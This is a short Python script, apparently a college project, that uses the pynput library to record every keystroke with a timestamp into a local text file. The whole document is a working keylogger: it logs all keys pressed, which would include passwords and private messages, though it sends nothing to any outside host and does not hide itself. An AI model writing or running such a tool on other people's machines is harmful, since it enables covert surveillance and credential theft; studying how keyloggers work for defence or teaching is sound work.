from pynput.keyboard import Key, Listener
import logging
log_dir = r"C:\Users\agasa\OneDrive\Desktop\college\Projects\Keylogger\log\k" 
logging.basicConfig(filename = (log_dir + "eyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
   logging.info(str(key))
with Listener(on_press=on_press) as listener:
    listener.join()
